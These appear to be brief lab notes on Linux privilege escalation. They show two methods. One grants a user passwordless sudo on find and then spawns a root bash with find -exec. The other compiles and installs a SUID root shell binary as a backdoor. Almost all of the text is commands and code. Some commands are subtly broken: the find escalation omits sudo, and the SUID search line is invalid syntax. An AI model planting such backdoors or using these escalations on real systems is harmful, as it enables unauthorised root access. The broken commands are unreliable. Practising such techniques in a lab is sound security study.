# Using find command
Victim
```
#useradd -m -s /bin/bash student
#passwd student
#apt install openssh-server -y
#systemctl enable --now ssh
#echo "student ALL=(ALL) NOPASSWD: /usr/bin/find" > /etc/sudoers.d/student
```

Attacker
```
ssh student@victim's_IP
sudo -l
find . -exec /bin/bash \; -quit (You can get the command using gtfobins.org)
```


# Using SUID
On Victim's Machine
#vim /tmp/rootbash.c
```
#include <unistd.h>
#include <stdlib.h>

int main() { 
    setuid(0); 
    system("/bin/bash");
    return 0;
}
```
#gcc /tmp/rootbash.c -o /usr/local/bin/rootbash
#chmod u+s /usr/local/bin/rootbash

On Attacker's Machine
ssh username@Victim's_IP
find -la -perm -4000 -type
/usr/local/bin/rootbash
